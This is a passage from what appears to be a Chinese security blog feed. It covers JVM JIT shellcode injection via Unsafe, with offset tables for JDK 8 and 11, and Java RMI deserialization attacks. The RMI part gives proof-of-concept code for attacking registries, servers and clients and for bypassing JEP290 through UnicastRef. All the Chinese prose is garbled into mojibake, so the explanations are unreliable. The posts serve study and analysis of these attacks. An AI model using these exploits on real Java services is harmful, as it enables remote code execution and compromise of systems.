JVMÁöÑJITÂú®ÂÜÖÂ≠ò‰∏≠ÊòØ‰∏Ä‰∏™ÂèØËØªÂèØÂÜôÂèØÊâßË°åÁöÑÂå∫ÂüüÔºåÊúÄÂêé‰ΩøÁî®UnsafeÁöÑputByteÊñπÊ≥ïÂÜôÂÖ•shellcodeÔºåÂÜçË∞ÉÁî®ÁõÆÊ†áÊñπÊ≥ïÂç≥ÂèØÊâßË°å„ÄÇËøôÈáåË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂ¶ÇÊûú‰ΩøÁî®Ê≤°ÊúâÊÅ¢Â§çÁé∞Âú∫ÔºåÂç≥Á†¥Âùè‰∫ÜÂéüÊúâÊ†àÂ∏ßÁöÑshellcodeÔºå‰ºöÂØºËá¥JVMÂ•îÊ∫ÉÔºåÂàáÂãøÂú®Áîü‰∫ßÁéØÂ¢É‰∏äÊµãËØï„ÄÇ ‰ª•‰∏äÁöÑDemo‰ª£Á†ÅÂèØ‰ª•@xxDarkÁöÑ JavaShellcodeInjectorÈ°πÁõÆ‰∏≠ÊµèËßà„ÄÇ ÈÉ®ÂàÜÈóÆÈ¢ò‰øÆÂ§çÂèäÊîπËøõÂú®32‰ΩçÁöÑJDKË∑ëDemoÔºåJRE‰ºöÊäõÂá∫‰∏™ÂºÇÂ∏∏ÔºåË∞ÉËØïÂèëÁé∞‰ªéÁõÆÊ†áÁ±ªÂÆû‰æãËé∑ÂèñInstanceKlassÁöÑÂÅèÁßªÔºöklassOffsetÔºå‰ªéÂÜÖÂ≠òÂèñÂà∞ÁöÑÂÄºÊòØ0Ôºå‰ΩøÂæóËé∑ÂèñÂà∞ÁöÑklass‰∏çÊ≠£Á°ÆÔºåÂØºËá¥UnsafeËØªÂèñ‰∫Ü‰∏Ä‰∏™ÂºÇÂ∏∏ÁöÑÂú∞ÂùÄ„ÄÇ ÈóÆÈ¢òÁöÑÂéüÂõ†ÁõÆÂâçËøò‰∏çÂæóËÄåÁü•Ôºå‰ΩÜÈÄöËøáHSDBÊâæÂà∞java.lang.ClassÁöÑInstanceKlassÂ∞±ÂèØ‰ª•ÁúãÂà∞klassÁöÑÂÅèÁßªÔºåÂêéÁª≠ÂÖ∂‰ªñËá™Âä®Ëé∑ÂèñÁöÑÂÅèÁßª‰πüÊ≤°ÊúâÂá∫Áé∞ÂºÇÂ∏∏„ÄÇ ‰∏äÈù¢Ëá™Âä®ÂåñÂú∞ËÆ°ÁÆóÂÅèÁßªÔºåË¶ÅÂä†ËΩΩJVMÁöÑÈìæÊé•Â∫ìÔºåËøòË¶ÅËé∑Âèñ‰∏ÄÂ†ÜJVMÈáåÁöÑÊï∞ÊçÆÁªìÊûÑ„ÄÅËÆ∞ÂΩï‰∏ÄÂ†ÜoopÂíåÂ∏∏ÈáèÊ±†ÁöÑÂÄºÔºåËøôË¶ÅÊòØÊÉ≥Â∞ÜPOCÂÜôÊàê‰∏Ä‰∏™Êñá‰ª∂ÁùÄÂÆûÊúâÁÇπ‰∏çÊñπ‰æøÂïä„ÄÇÈÇ£ÊúâÊ≤°Êúâ‰∏ÄÁßçÁÆÄÂçïÁ≤óÊö¥ÁöÑÊñπÊ≥ïÂë¢Ôºü Á≠îÊ°àÊòØËÇØÂÆöÁöÑ„ÄÇÁ¨îËÄÖÂàöÂ•ΩË£ÖÊúâÂ§ö‰∏™ÁâàÊú¨ÁöÑJDKÔºåÂèëÁé∞JDKÂ§ßÁâàÊú¨Âíå‰ΩçÊï∞Áõ∏ÂêåÁöÑÊó∂ÂÄôÔºå‰∏äÈù¢ÈÇ£‰∫õÂÅèÁßªÊòØ‰∏çÂèòÁöÑ„ÄÇÁøªÁúãJDKÁöÑÊ∫êÁ†Å‰∏çÈöæÂèëÁé∞ÔºåËøô‰∫õoffsetÂΩíÊ†πÁªìÂ∫ïÊòØÁî±offset_ofÂÆèÂæóÂá∫Ôºå‰∏Ä‰∏™‰∏éCËØ≠Ë®Äoffsetof‰ΩúÁî®Áõ∏ÂêåÁöÑÂÆèÔºåÁªìÊûúÊòØ‰∏Ä‰∏™ÁªìÊûÑÊàêÂëòÁõ∏ÂØπ‰∫éÁªìÊûÑÂºÄÂ§¥ÁöÑÂ≠óËäÇÂÅèÁßªÈáè„ÄÇ ËÄåÈÄöËøá‰πãÂâçÊü•ÈòÖÁöÑËµÑÊñôÂæóÁü•Ôºå‰∏çÂêåJDKÂ§ßÁâàÊú¨‰πãÈó¥ÁöÑoopÊï∞ÊçÆÁªìÊûÑÊâçÂ≠òÂú®Â∑ÆÂºÇÔºåÊàë‰ª¨Âè™Ë¶ÅËÆ∞ÂΩï‰∏ãËøô‰∫õÁõ∏ÂêåÊû∂ÊûÑÂíåÂ§ßÁâàÊú¨ÁöÑÂÅèÁßªÔºåÂ∞±ËÉΩÁõ¥Êé•ËÆ°ÁÆóÂá∫JITÁöÑÂú∞ÂùÄÔºåÂèØ‰ª•ÂÖçÂéªÂä†ËΩΩJVMÈìæÊé•Â∫ìÂíåÊî∂ÈõÜ„ÄÅÂ≠òÂÇ®JVMÈáåÊï∞ÊçÆÁªìÊûÑÁöÑÊìç‰Ωú„ÄÇ ‰ª•‰∏ãÊòØÁ¨îËÄÖÊî∂ÈõÜÁöÑÈÉ®ÂàÜLTSÁâàÊú¨JDKÁöÑoopÁõ∏ÂÖ≥ÂÅèÁßªÔºö 1234567891011121314151617181920212223242526272829303132333435363738// JDK8 x32static int klassOffset = 0x44;static int methodArrayOffset = 0xe4;static int methodsOffset = 0x4;static int constMethodOffset = 0x4;static int constantPoolTypeSize = 0x2c;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x1a;static int signatureIndexOffset = 0x1c;static int _from_compiled_entry = 0x24;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK8 x64static int klassOffset = 0x48;static int methodArrayOffset = 0x180;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x50;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x22;static int signatureIndexOffset = 0x24;static int _from_compiled_entry = 0x40;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK11 x64static int klassOffset = 0x50;static int methodArrayOffset = 0x198;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x40;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x2a;static int signatureIndexOffset = 0x2c;static int _from_compiled_entry = 0x38;static int symbolTypeBodyOffset = 0x6;static int symbolTypeLengthOffset = 0x0; ÂêéËÆ∞Á¨îËÄÖÂú®JDK7‰πüÊõæÂ∞ùËØïÊ≥®ÂÖ•shellcodeÔºå‰ΩÜÊúÄÂêéËøòÊòØ‰ª•Â§±Ë¥•ÂëäÁªàÔºå‰∏ç‰ªÖÊòØÂõ†‰∏∫JDK7Âà∞JDK8ÁöÑoopÊï∞ÊçÆÁªìÊûÑÂèëÁîü‰∫ÜÂæàÂ§ßÁöÑÂèòÂåñÔºåËÄå‰∏îJDK7‰∏≠ÁöÑÁ±ªÁ§∫‰æã‰∏≠Âπ∂Ê≤°ÊúâInstanceKlassÁªìÊûÑÊàêÂëòÔºå‰ΩÜjava_lang_CLass‰∏≠ÂèàÁ°ÆÁ°ÆÂÆûÂÆûÂ≠òÂú®_klass_offsetËøô‰∏™ÁªìÊûÑÊàêÂëòÔºåËøôÁÇπÂ∞±ÊØîËæÉÂ•áÊÄ™„ÄÇ ÁøªÁúãÂÆòÊñπÂ∑•ÂÖ∑HSDBÊ∫êÁ†ÅÔºåÂèëÁé∞ÂÆÉÊòØÈÄöËøáBasicHashtable&lt;mtInternal&gt;ÁöÑ_bucketsÁªìÊûÑÊàêÂëòËé∑ÂèñÊâÄÊúâInstanceKlassÁöÑ„ÄÇÁî±‰∫éJDK7‰∏äPOCÁöÑoopÊï∞ÊçÆÁªìÊûÑÈúÄË¶ÅÊîπÂä®ËæÉÂ§öÔºå‰∏îËøò‰∏çÁü•ÈÅìBasicHashtable&lt;mtInternal&gt;Ë¶ÅÊÄé‰πàËé∑ÂèñÔºåÊâÄ‰ª•JDK7‰∏ãÁöÑPOCËøòÊú™ÂÆûÁé∞„ÄÇ ÊúÄÂêé‰∏§‰∏™ÁöÑshellcodeÊ≥®ÂÖ•ÊñπÊ≥ïÂü∫‰∫éOracle JDKÂíåOpenjdkÁöÑÈªòËÆ§JVMÔºöHotSpotÔºåÂÖ∂‰ªñ‰∏Ä‰∫õÁöÑJVMÁöÑÂÆûÁé∞ÊñπÊ≥ïÂ∞±Ë¶ÅÈùôÂæÖÂêÑ‰ΩçÂ∏àÂÇÖÂèëÊéò„ÄÇ Êñá‰∏≠Ëã•ÊúâÈîôËØØÁöÑÂú∞ÊñπÔºåÊúõÂêÑ‰ΩçÂ∏àÂÇÖ‰∏çÂêùÊñßÊ≠£„ÄÇ ÂèÇËÄÉhttps://xz.aliyun.com/t/10075 https://www.slideshare.net/RyanWincey/java-shellcodeoffice https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java https://qiankunli.github.io/2014/10/27/jvm_classloader.html https://www.sczyh30.com/posts/Java/jvm-klass-oop/ https://jishuin.proginn.com/p/763bfbd58ef3 https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>JVM</tag>
        <tag>HotSpot</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java RMIÊîªÂáªÂàÜÊûê‰∏éÊÄªÁªì]]></title>
    <url>%2F2022%2F02%2F16%2FJava_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[RMIÁÆÄ‰ªãJavaËøúÁ®ãÊñπÊ≥ïË∞ÉÁî®ÔºåÂç≥Java RMIÔºàJava Remote Method InvocationÔºâÊòØJavaÁºñÁ®ãËØ≠Ë®ÄÈáåÔºå‰∏ÄÁßçÁî®‰∫éÂÆûÁé∞ËøúÁ®ãËøáÁ®ãË∞ÉÁî®ÁöÑÂ∫îÁî®Á®ãÂ∫èÁºñÁ®ãÊé•Âè£„ÄÇÂÆÉ‰ΩøÂÆ¢Êà∑Êú∫‰∏äËøêË°åÁöÑÁ®ãÂ∫èÂèØ‰ª•Ë∞ÉÁî®ËøúÁ®ãÊúçÂä°Âô®‰∏äÁöÑÂØπË±°„ÄÇËøúÁ®ãÊñπÊ≥ïË∞ÉÁî®ÁâπÊÄß‰ΩøJavaÁºñÁ®ã‰∫∫ÂëòËÉΩÂ§üÂú®ÁΩëÁªúÁéØÂ¢É‰∏≠ÂàÜÂ∏ÉÊìç‰Ωú„ÄÇÂÆÉÊòØÁî±Ê≥®ÂÜå‰∏≠ÂøÉ„ÄÅÊúçÂä°Á´ØÂíåÂÆ¢Êà∑Á´Ø‰∏âÈÉ®ÂàÜÁªÑÊàê„ÄÇ Ê≥®ÂÜå‰∏≠ÂøÉ ‰Ωú‰∏∫Â≠òÂÇ®ËøúÁ®ãÊñπÊ≥ïÁöÑ‰ª£ÁêÜÂØπË±°ÁöÑ‰ªìÂ∫ì„ÄÇ ÊúçÂä°Á´Ø Êö¥Èú≤ËøúÁ®ãÂØπË±°ÔºåÂπ∂Â∞ÜÂÖ∂‰ª£ÁêÜÂØπË±°Ê≥®ÂÜåËøõ RMI Registry„ÄÇ‰∏Ä‰∏™‰ª£ÁêÜÂØπË±°Âú®ÊúçÂä°Á´Ø‰∏≠ÂåÖÂê´‰∏Ä‰∏™skeletonÂØπË±°ÔºåÁî®‰∫éÊé•ÂèóÊù•Ëá™stubÂØπË±°ÁöÑË∞ÉÁî®„ÄÇ ÂÆ¢Êà∑Á´Ø Êü•ÊâæËøúÁ®ã‰ª£ÁêÜÂØπË±°ÔºåËøúÁ®ãË∞ÉÁî®ÊúçÂä°ÂØπË±°„ÄÇ‰∏Ä‰∏™‰ª£ÁêÜÂØπË±°Âú®Ë∞ÉÁî®ËØ•ËøúÁ®ãÂØπË±°ÁöÑÂÆ¢Êà∑Á´Ø‰∏äÂåÖÂê´‰∏Ä‰∏™stubÂØπË±°ÔºåË¥üË¥£Ë∞ÉÁî®ÂèÇÊï∞ÂíåËøîÂõûÂÄºÁöÑÂ∫èÂàóÂåñ„ÄÅÊâìÂåÖËß£ÂåÖÔºå‰ª•ÂèäÁΩëÁªúÂ±ÇÁöÑÈÄöËÆØËøáÁ®ã„ÄÇ ÊîªÂáªÊñπÂºèRMIÁöÑÂêÑÁßçÊîªÂáªÊñπÂºèÊú¨Ë¥®‰∏äÊòØÂà©Áî®ÂØπË±°‰º†ËæìËøáÁ®ã‰∏≠ÂèçÂ∫èÂàóÂåñÂÆûÁé∞ÁöÑÔºå‰ª•‰∏ãÊòØÂá†ÁßçÂ∏∏ËßÅÁöÑÊîªÂáªÊñπÂºè„ÄÇ ÊîªÂáªÊ≥®ÂÜå‰∏≠ÂøÉÂΩìÊúçÂä°Á´ØÂêëÊ≥®ÂÜå‰∏≠ÂøÉÊ≥®ÂÜåÊó∂ÔºåÊ≥®ÂÜå‰∏≠ÂøÉ‰ºöÂèçÂ∫èÂàóÂåñÊúçÂä°Á´ØÁªëÂÆöÁöÑÂØπË±°ÔºåÂÖ∑‰Ωì‰ΩìÁé∞Âú®sun.rmi.registry.RegistryImpl_Skel#dispatch„ÄÇÂΩìÊúçÂä°Á´ØÊ≥®ÂÜåÁªëÂÆöÁöÑÊòØ‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÂØπË±°Êó∂ÔºåÂ∞±ÂèØÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÂΩìÁÑ∂ÔºåÁî±‰∫éÁªëÂÆöÁöÑÂØπË±°ÈúÄË¶ÅÊó∂RemoteÂØπË±°ÔºåÊâÄ‰ª•ÊÅ∂ÊÑèÂØπË±°ÈúÄË¶ÅÂÆûÁé∞‰ΩøÁî®‰ª£ÁêÜÁ±ªÊàñÊîπÂÜôÊ≥®ÂÜåÊñπÊ≥ïÊâçËÉΩÊ≥®ÂÜåÁªëÂÆö„ÄÇ Âú®ËøúÁ®ãÊñπÊ≥ïÂÆû‰æãÂåñÁöÑËøáÁ®ã‰∏≠ÔºåË∞ÉÁî®ÁöÑÁà∂Á±ªjava.rmi.server.UnicastRemoteObjectÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåÊúÄÁªàÊòØË∞ÉÁî®‰∫Üsun.rmi.server.Util#createProxyÊñπÊ≥ïÂàõÂª∫RemoteÁöÑÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÂØπË±°Âπ∂ËøîÂõû„ÄÇ POC‰∏≠ÁöÑÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÊåâÁÖßcreateProxyÊñπÊ≥ï‰∏≠ÈÄªËæëÂÜôÂç≥ÂèØÔºåÂÖ∂‰∏≠InvocationHandlerÂ≠êÁ±ªÈÄöÂ∏∏ÈÄâÊã©sun.reflect.annotation.AnnotationInvocationHandlerÔºåÂÆÉÂÖ∑ÊúâMap&lt;String, Object&gt;Á±ªÂûãÁöÑÂ±ûÊÄßmemberValuesÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÁªëÂÆöÂèçÂ∫èÂàóÂåñÁöÑÊÅ∂ÊÑèÂØπË±°„ÄÇ ÊúÄÁªàPOCÂ¶Ç‰∏ãÔºö 123456789101112131415Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put("obj", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1009);registry.bind("AttackRegistry", remoteObj); ÊîªÂáªÊúçÂä°Á´ØÂèçÂ∫èÂàóÂåñÂèÇÊï∞ÊîªÂáªÊúçÂä°Á´ØÂÖ∂‰∏≠‰∏ÄÁßçÊñπÊ≥ïÊòØÈÄöËøáÂèçÂ∫èÂàóÂåñËøúÁ®ãÊñπÊ≥ïÂèÇÊï∞ÂÆûÁé∞ÁöÑ„ÄÇÊúçÂä°Á´ØÂèçÂ∫èÂàóÂåñÂèÇÊï∞‰ΩìÁé∞Âú®sun.rmi.server.UnicastServerRef#dispatchÊñπÊ≥ïÈáåË∞ÉÁî®ÁöÑunmarshalParametersÊñπÊ≥ïÔºåÊúÄÁªàÈÄöËøásun.rmi.server.UnicastRef#unmarshalValueÊñπÊ≥ïÂèçÂ∫èÂàóÂåñÈùûÂü∫Êú¨Á±ªÂûãÁöÑÂèÇÊï∞„ÄÇ 1234567 protected static Object unmarshalValue(Class&lt;?&gt; var0, ObjectInput var1) throws IOException, ClassNotFoundException &#123; if (var0.isPrimitive()) &#123; ... &#125; else &#123; return var1.readObject(); &#125;&#125; ÂèçÂ∫èÂàóÂåñÂèÇÊï∞ÁöÑÂà©Áî®POCÊØîËæÉÁÆÄÂçïÔºå‰ΩÜÈúÄË¶ÅÊúçÂä°Á´Ø‰ª•ObjectÊú™ÂèÇÊï∞ÁöÑËøúÁ®ãÊñπÊ≥ïÔºåDemoÂ¶Ç‰∏ãÔºö 123456789101112131415# Êé•Âè£public interface IRemoteMethod extends Remote &#123; public IRemoteMethod exploit(Object obj) throws RemoteException;&#125;# ÂÆûÁé∞Á±ªpublic class RemoteMethod extends UnicastRemoteObject implements IRemoteMethod &#123; protected RemoteMethod() throws RemoteException &#123; &#125; public IRemoteMethod exploit(Object obj) throws RemoteException &#123; return null; &#125;&#125; ÁÑ∂ÂêéÂú®ÂÆ¢Êà∑Á´ØÈáåÊîæ‰∏äÂêåÊ†∑ÁöÑÊé•Âè£Ôºå‰ªéÊ≥®ÂÜå‰∏≠ÂøÉËé∑ÂèñËøúÁ®ãÊñπÊ≥ï‰ø°ÊÅØÔºåÂπ∂‰ª•ÊÅ∂ÊÑèÂØπË±°Ë∞ÉÁî®ËøúÁ®ãÊñπÊ≥ïÂç≥ÂèØ„ÄÇ 1234public static void main(String[] args) throws Exception &#123; IRemoteMethod remoteMethod = (IRemoteMethod) new InitialContext().lookup("rmi://192.168.78.137:1009/RemoteMethod""); remoteMethod.exploit(evilObject());&#125; ÂØπ‰∫éÈùûObjectÂèÇÊï∞Ôºå‰ΩÜÂèàÊòØObjectÂ≠êÁ±ªÁöÑËøúÁ®ãÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Âä®ÊÄÅ‰ª£ÁêÜÊàñÁªßÊâøËØ•Â≠êÁ±ªÁöÑÊñπÊ≥ïÁªïËøá„ÄÇ ÊîªÂáªÂÆ¢Êà∑Á´ØÂèçÂ∫èÂàóÂåñÊ≥®ÂÜåÁªëÂÆöÂØπË±°ÂΩìÂÆ¢Êà∑Á´ØlookupÊó∂Ôºå‰πü‰ºö‰ªéÊ≥®ÂÜå‰∏≠ÂøÉËé∑ÂèñÂπ∂ÂèçÂ∫èÂàóÂåñÊ≥®ÂÜåÁªëÂÆöÁöÑÂØπË±°ÔºåËøôÊó∂ÁöÑÂèçÂ∫èÂàóÂåñÊòØÂú®Â≠òÊ†πsun.rmi.registry.RegistryImpl_Stub#lookupÊñπÊ≥ï‰∏≠ËøõË°å„ÄÇPOCÁöÑÊûÑÈÄ†‰πü‰∏éÊ≥®ÂÜå‰∏≠ÂøÉÂèçÂ∫èÂàóÂåñÁöÑÂ∑Æ‰∏çÂ§öÔºåÂè™ÊòØÊîπÊàêÁî±Ê≥®ÂÜå‰∏≠ÂøÉÊ≥®ÂÜåÁªëÂÆöÊÅ∂ÊÑèÁ±ªÔºö 123456789101112131415Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put("obj", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);Registry registry = LocateRegistry.createRegistry(1009);registry.bind("AttackRegistry", remoteObj); ÂèçÂ∫èÂàóÂåñËøîÂõûÂÄºÂΩìËøúÁ®ãÊñπÊ≥ïÁöÑËøîÂõûÂÄº‰∏ç‰∏∫Á©∫Ôºå‰∏î‰∏ç‰∏∫Âü∫Á°ÄÁ±ªÂûãÊó∂ÔºåÂ∞±‰ºöÂØπËøîÂõûÂÄºËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇÂèçÂ∫èÂàóÂåñËøîÂõûÂÄº‰∏éÊúçÂä°Á´ØÂèçÂ∫èÂàóÂåñÂèÇÊï∞ÁöÑË∞ÉÁî®Ê†àÁ±ª‰ººÔºåÊúÄÁªàÈÉΩÊòØÈÄöËøásun.rmi.server.UnicastRef#unmarshalValueÊñπÊ≥ïÂèçÂ∫èÂàóÂåñ„ÄÇ POC‰πüÂæàÁÆÄÂçïÔºåËøúÁ®ãÊñπÊ≥ïÁõ¥Êé•ËøîÂõûÊÅ∂ÊÑèÂØπË±°Âç≥ÂèØÔºö 123456public class AttackerRemoteMethod extends UnicastRemoteObject implements IAttackerRemoteMethod &#123; public Object exploit() throws RemoteException &#123; return evilObject(); &#125;&#125; JEP290ÂèäÂÖ∂ÁªïËøáJEP290ÊòØJDK9ÂºïÂÖ•ÁöÑËßÑËåÉÔºåÂπ∂‰∏îÂêë‰∏ãÂÖºÂÆπÂà∞JDK 8u121„ÄÅJDK 7u131ÂíåJDK 6u141„ÄÇÂÖ∂Ê†∏ÂøÉÊú∫Âà∂ÊòØÁî±Â∫èÂàóÂåñÂÆ¢Êà∑Á´ØÂÆûÁé∞Âπ∂ËÆæÁΩÆÂú®ObjectInputStreamÔºåÂú®ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠Ë∞ÉÁî®ËøáÊª§Âô®Êé•Âè£ÊñπÊ≥ïÊù•È™åËØÅÊ≠£Âú®ÂèçÂ∫èÂàóÂåñÁöÑÁ±ª„ÄÅÊ≠£Âú®ÂàõÂª∫ÁöÑÊï∞ÁªÑÁöÑÂ§ßÂ∞è‰ª•ÂèäÂèçÂ∫èÂàóÂåñÁöÑÈïøÂ∫¶„ÄÅÊ∑±Â∫¶ÂíåÂèçÂ∫èÂàóÂåñÊó∂ÂºïÁî®ÁöÑÊï∞ÈáèÔºåËøîÂõûREJECTED„ÄÅALLOWEDÊàñUNDECIDEDÁä∂ÊÄÅ„ÄÇ‰ªñÁöÑËøáÊª§Êé•Âè£ÊñπÊ≥ïÂπ∂‰∏çÊòØÈªòËÆ§ÈÖçÁΩÆÁöÑÔºåËÄåÊòØÈÄöËøájdk.serialFilterÂ±ûÊÄßËÆæÁΩÆÂÖ®Â±ÄËøáÊª§Êé•Âè£ÊñπÊ≥ïÊàñsetObjectInputFilterÊñπÊ≥ïËÆæÁΩÆÂ±ÄÈÉ®ËøáÊª§Êé•Âè£ÊñπÊ≥ï„ÄÇ Âú®RMIÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠‰ªÖÊ≥®ÂÜå‰∏≠ÂøÉÂú®sun.rmi.registry.RegistryImpl#registryFilter‰∏≠ÂÆûÁé∞ÔºåÂØπÂèçÂ∫èÂàóÂåñÁöÑÊ∑±Â∫¶„ÄÅÊï∞ÁªÑÂ§ßÂ∞èÂíåÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÂÅö‰∫ÜÈôêÂà∂„ÄÇ 1234567891011121314151617181920212223private static Status registryFilter(FilterInfo var0) &#123; if (registryFilter != null) &#123; Status var1 = registryFilter.checkInput(var0); if (var1 != Status.UNDECIDED) &#123; return var1; &#125; &#125; if (var0.depth() &gt; 20L) &#123; return Status.REJECTED; &#125; else &#123; Class var2 = var0.serialClass(); if (var2 != null) &#123; if (!var2.isArray()) &#123; return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; &#125; else &#123; return var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; 1000000L ? Status.REJECTED : Status.UNDECIDED; &#125; &#125; else &#123; return Status.UNDECIDED; &#125; &#125;&#125; UnicastRef Á±ªÁªïËøáUnicastRef ÊòØRMIÊ≥®ÂÜå‰∏≠ÂøÉÂèçÂ∫èÂàóÂåñÁôΩÂêçÂçï‰∏≠ÁöÑÁ±ªÔºåÊòØÊ≠£Â∏∏bindÂØπË±°ÂêéÊ≥®ÂÜå‰∏≠ÂøÉÂæóÂà∞ÁöÑstub‰∏≠ÁöÑÂ±ûÊÄß„ÄÇ ‰∏ãÈù¢Ë∞ÉËØï‰∏ãÊ≠£Â∏∏ÁöÑÊ≥®ÂÜåÊµÅÁ®ãÔºåÁõ¥Êé•Âú®sun.rmi.registry.RegistryImpl_Skel#dispatchÂ§ÑÔºåÊ≥®ÂÜå‰∏≠ÂøÉÂèçÂ∫èÂàóÂåñÊúçÂä°Á´ØbindÂØπË±°ÂºÄÂßã„ÄÇÊé•ÁùÄË∞ÉÁî®Â∞ÅË£ÖÁ±ªÁöÑÁà∂Á±ªRemoteObjectÁöÑËá™ÂÆö‰πâreadObjectÊñπÊ≥ï„ÄÇÂú®ËøôÈáå‰ºöÂÆû‰æãÂåñReferenceÁ±ªUnicastRefÔºåÂπ∂Ë∞ÉÁî®‰ªñÁöÑreadExternalÂèçÂ∫èÂàóÂåñ„ÄÇreadExternalÈáåÊé•ÁùÄË∞ÉÁî®sun.rmi.transport.LiveRef#readÁªôUnicastRefÁöÑrefÂ±ûÊÄßËµãÂÄº„ÄÇ 123456read:291, LiveRef (sun.rmi.transport)readExternal:489, UnicastRef (sun.rmi.server)readObject:455, RemoteObject (java.rmi.server)...readObject:431, ObjectInputStream (java.io)dispatch:76, RegistryImpl_Skel (sun.rmi.registry) sun.rmi.transport.LiveRef#readÊñπÊ≥ïÈáåÔºå‰∏ªË¶ÅÈÄªËæëÊòØ‰ªéËæìÂÖ•ÊµÅ‰∏≠Ëé∑ÂèñTCPEndpointÂíåObjIDÔºåÊù•ÂàùÂßãÂåñLiveRefÂπ∂ËøîÂõû„ÄÇËøôÈáåÁöÑTCPEndpointËÆ∞ÂΩïÁùÄÊúçÂä°Á´ØÁõëÂê¨ÁöÑÂú∞ÂùÄÂíåÁ´ØÂè£ÔºåÂπ∂‰∏îÊñπÊ≥ïÈáå‰øùÂ≠òLiveRefÂà∞ËæìÂÖ•ÊµÅÁöÑÊìç‰Ωú‰ºöÂ∞ÜTCPEndpoint‰øùÂ≠òÂà∞ËæìÂÖ•ÊµÅÁöÑincomingRefTableÂ±ûÊÄß‰∏≠ÔºåËøô‰∏ÄÊ≠•ÂæàÂÖ≥ÈîÆ„ÄÇ ÂèçÂ∫èÂàóÂåñÁªìÊùüÂêéÂ∞±ÊòØÊ≥®ÂÜåÂºïÁî®ÁöÑÊµÅÁ®ã„ÄÇ Âú®sun.rmi.transport.DGCImpl_Stub#dirtyÊñπÊ≥ïÈ¶ñÂÖàÂà©Áî®ÂèçÂ∫èÂàóÂåñÁöÑUnicastRefÂª∫Á´ãËøûÊé•ÔºåËøîÂõû‰∏Ä‰∏™StreamRemoteCallÂØπË±°ÔºåÊé•ÁùÄË∞ÉÁî®ÂÆÉÁöÑinvokeÊñπÊ≥ï„ÄÇ invokeÊñπÊ≥ïÊúÄÂêéË∞ÉÁî®ÁöÑÊòØStreamRemoteCallÂØπË±°ÁöÑexecuteCallÊñπÊ≥ïÔºåÈÄöËøágetInputStreamÊñπÊ≥ï‰ªéconnÂ±ûÊÄßËé∑ÂèñËæìÂÖ•ÊµÅËµãÂÄºÁªôinÂ±ûÊÄßÔºåÁÑ∂Âêé‰ªéËæìÂÖ•ÊµÅ‰∏≠Ëé∑Âèñ‰∏Ä‰∏™Â≠óËäÇËµãÁªôvar1ÔºåËøõÂÖ•switchËØ≠Âè•‰∏≠Ôºå‰∏∫2ÂàôÂèçÂ∫èÂàóÂåñËæìÂÖ•ÊµÅ„ÄÇËá≥Ê≠§‰∏éUnicateRefÁªïËøáJEP290ÁöÑÊµÅÁ®ãÂ∞±ÁªìÊùü‰∫Ü„ÄÇ 12345678910111213141516171819202122232425262728public void executeCall() throws Exception &#123; DGCAckHandler var2 = null; byte var1; try &#123; ... this.getInputStream(); var1 = this.in.readByte(); this.in.readID(); &#125; catch (UnmarshalException var11) &#123; ... &#125; switch(var1) &#123; case 1: return; case 2: Object var14; try &#123; var14 = this.in.readObject(); &#125; catch (Exception var10) &#123; throw new UnmarshalException("Error unmarshaling return", var10); &#125; ... &#125; ...&#125; 